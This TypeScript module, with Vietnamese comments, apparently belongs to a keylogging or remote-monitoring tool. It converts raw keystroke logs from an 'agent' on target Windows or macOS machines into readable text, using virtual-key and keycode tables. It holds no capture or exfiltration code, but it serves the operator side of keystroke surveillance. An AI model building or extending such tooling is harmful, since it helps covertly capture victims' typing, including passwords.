/**
 * Chuyển log thô từ agent thành chuỗi dễ đọc: bỏ timestamp, đổi vk (Win) / keycode (macOS).
 * Agent không gửi shift/layout — hiển thị theo phím US QWERTY, chữ thường (A–Z) như gõ không Shift.
 * Bàn phím TELEX/VNI: vẫn chỉ thấy đúng “phím vật lý” US, không phải chữ có dấu cuối cùng.
 */

export type KeylogTargetOs = 'Windows' | 'macOS';

/**
 * macOS kVK_* (Carbon) = CGEvent keycode (decimal).
 * Tham chiếu: Carbon Events.h (ANSI + keypad + arrows + modifiers).
 */
const MAC_KVK: Record<number, string> = {
    0x00: 'a',
    0x01: 's',
    0x02: 'd',
    0x03: 'f',
    0x04: 'h',
    0x05: 'g',
    0x06: 'z',
    0x07: 'x',
    0x08: 'c',
    0x09: 'v',
    0x0a: '[Section]',
    0x0b: 'b',
    0x0c: 'q',
    0x0d: 'w',
    0x0e: 'e',
    0x0f: 'r',
    0x10: 'y',
    0x11: 't',
    0x12: '1',
    0x13: '2',
    0x14: '3',
    0x15: '4',
    0x16: '6',
    0x17: '5',
    0x18: '=',
    0x19: '9',
    0x1a: '7',
    0x1b: '-',
    0x1c: '8',
    0x1d: '0',
    0x1e: ']',
    0x1f: 'o',
    0x20: 'u',
    0x21: '[',
    0x22: 'i',
    0x23: 'p',
    0x24: '\n',
    0x25: 'l',
    0x26: 'j',
    0x27: "'",
    0x28: 'k',
    0x29: ';',
    0x2a: '\\',
    0x2b: ',',
    0x2c: '/',
    0x2d: 'n',
    0x2e: 'm',
    0x2f: '.',
    0x30: '[Tab]',
    0x31: ' ',
    0x32: '`',
    0x33: '[Backspace]',
    0x35: '[Esc]',
    0x37: '[Cmd]',
    0x38: '[Shift]',
    0x39: '[Caps]',
    0x3a: '[Opt]',
    0x3b: '[Ctrl]',
    0x3c: '[RShift]',
    0x3d: '[ROpt]',
    0x3e: '[RCtrl]',
    0x3f: '[fn]',
    0x41: '[num .]',
    0x43: '[num *]',
    0x45: '[num +]',
    0x47: '[Clear]',
    0x4b: '[num /]',
    0x4c: '[num Enter]',
    0x4e: '[num -]',
    0x51: '[num =]',
    0x52: '[num 0]',
    0x53: '[num 1]',
    0x54: '[num 2]',
    0x55: '[num 3]',
    0x56: '[num 4]',
    0x57: '[num 5]',
    0x58: '[num 6]',
    0x59: '[num 7]',
    0x5b: '[num 8]',
    0x5c: '[num 9]',
    0x60: 'F5',
    0x61: 'F6',
    0x62: 'F7',
    0x63: 'F3',
    0x64: 'F8',
    0x65: 'F9',
    0x67: 'F11',
    0x69: 'F13',
    0x6a: 'F16',
    0x6b: 'F14',
    0x6d: 'F10',
    0x6f: 'F12',
    0x71: 'F15',
    0x72: '[Help]',
    0x73: '[Home]',
    0x74: '[PgUp]',
    0x75: '[Del]',
    0x77: '[End]',
    0x79: '[PgDn]',
    0x7b: '←',
    0x7c: '→',
    0x7d: '↓',
    0x7e: '↑',
};

const WIN_VK: Record<number, string> = {
    8: '[Backspace]',
    9: '[Tab]',
    13: '\n',
    16: '[Shift]',
    17: '[Ctrl]',
    18: '[Alt]',
    19: '[Pause]',
    20: '[Caps]',
    27: '[Esc]',
    32: ' ',
    33: '[PgUp]',
    34: '[PgDn]',
    35: '[End]',
    36: '[Home]',
    37: '←',
    38: '↑',
    39: '→',
    40: '↓',
    44: '[PrtSc]',
    45: '[Ins]',
    46: '[Del]',
    91: '[Win]',
    92: '[Win]',
    93: '[Menu]',
    96: '0',
    97: '1',
    98: '2',
    99: '3',
    100: '4',
    101: '5',
    102: '6',
    103: '7',
    104: '8',
    105: '9',
    106: '*',
    107: '+',
    109: '-',
    110: '.',
    111: '/',
    112: 'F1',
    113: 'F2',
    114: 'F3',
    115: 'F4',
    116: 'F5',
    117: 'F6',
    118: 'F7',
    119: 'F8',
    120: 'F9',
    121: 'F10',
    122: 'F11',
    123: 'F12',
    144: '[NumLock]',
    145: '[ScrollLock]',
    186: ';',
    187: '=',
    188: ',',
    189: '-',
    190: '.',
    191: '/',
    192: '`',
    219: '[',
    220: '\\',
    221: ']',
    222: "'",
};

function winVkToChar(vk: number): string {
    if (vk >= 0x41 && vk <= 0x5a) {
        return String.fromCharCode(vk + 32);
    }
    if (vk >= 0x30 && vk <= 0x39) {
        return String.fromCharCode(vk);
    }
    const s = WIN_VK[vk];
    if (s !== undefined) return s;
    return `[${vk}]`;
}

function macKeycodeToChar(code: number): string {
    const s = MAC_KVK[code];
    if (s !== undefined) return s;
    return `[${code}]`;
}

function effectiveOs(raw: string, preferred: KeylogTargetOs): KeylogTargetOs {
    if (/\bvk=\d+/.test(raw)) return 'Windows';
    if (/\bkeycode=\d+/.test(raw)) return 'macOS';
    return preferred;
}

function parseLine(line: string, os: KeylogTargetOs): string | null {
    const stripped = line.replace(/^\d+\s+/, '').trim();
    if (!stripped) return null;
    if (stripped.startsWith('ERROR:')) {
        return `\n${stripped}\n`;
    }
    if (stripped === 'KEYLOGGER_START ok') {
        return null;
    }

    if (os === 'Windows') {
        const m = /vk=(\d+)/.exec(stripped);
        if (m) return winVkToChar(Number(m[1]));
    } else {
        const m = /keycode=(\d+)/.exec(stripped);
        if (m) return macKeycodeToChar(Number(m[1]));
    }

    return `\n${stripped}\n`;
}

/**
 * Ghép các sự kiện phím thành một chuỗi (không còn timestamp).
 */
export function formatKeylogDisplay(raw: string, os: KeylogTargetOs): string {
    if (!raw.trim()) return '';

    const useOs = effectiveOs(raw, os);
    const lines = raw.split(/\r?\n/);
    const parts: string[] = [];

    for (const line of lines) {
        const piece = parseLine(line, useOs);
        if (piece !== null) {
            parts.push(piece);
        }
    }

    return parts.join('');
}
